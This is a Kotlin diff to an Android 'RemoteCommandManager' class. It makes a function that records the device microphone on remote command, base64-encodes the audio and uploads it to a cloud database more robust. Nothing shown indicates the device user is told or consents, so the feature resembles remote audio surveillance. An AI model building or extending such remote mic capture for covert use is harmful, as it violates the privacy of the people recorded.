@@ -772,23 +772,49 @@ class RemoteCommandManager(private val context: Context) {
             MediaRecorder()
         }
 
+        var isRecordingStarted = false
+        var recordError: Exception? = null
+
         try {
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
             recorder.setAudioEncodingBitRate(64000)
             recorder.setAudioSamplingRate(22050)
+            recorder.setMaxDuration(finalDuration.toInt() * 1000)
             recorder.setOutputFile(outFile.absolutePath)
 
             recorder.prepare()
             recorder.start()
+            isRecordingStarted = true
 
+            // Wait for specified duration
             delay(finalDuration * 1000L)
+        } catch (e: Exception) {
+            recordError = e
+        } finally {
+            if (isRecordingStarted) {
+                try {
+                    recorder.stop()
+                } catch (e: Exception) {
+                    Log.e("RemoteCommandManager", "MediaRecorder stop exception: ${e.message}")
+                }
+            }
+            try {
+                recorder.reset()
+            } catch (_: Exception) {}
+            try {
+                recorder.release()
+            } catch (_: Exception) {}
+        }
 
-            recorder.stop()
-            recorder.release()
+        if (recordError != null && (!outFile.exists() || outFile.length() == 0L)) {
+            try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
+            throw recordError!!
+        }
 
-            if (outFile.exists() && outFile.length() > 0) {
+        if (outFile.exists() && outFile.length() > 0) {
+            try {
                 val audioBytes = outFile.readBytes()
                 val base64Audio = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
                 val nowMs = System.currentTimeMillis()
@@ -812,15 +838,13 @@ class RemoteCommandManager(private val context: Context) {
                     Log.e("RemoteCommandManager", "Failed to upload audio recording to RTDB: ${e.message}")
                 }
 
-                "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Cloud."
-            } else {
-                throw Exception("Audio recording file empty or failed.")
+                return@withContext "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Cloud."
+            } finally {
+                try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
             }
-        } catch (e: Exception) {
-            try { recorder.reset(); recorder.release() } catch (_: Exception) {}
-            throw e
-        } finally {
+        } else {
             try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
+            throw Exception("Audio recording failed or output file empty.")
         }
     }
 }
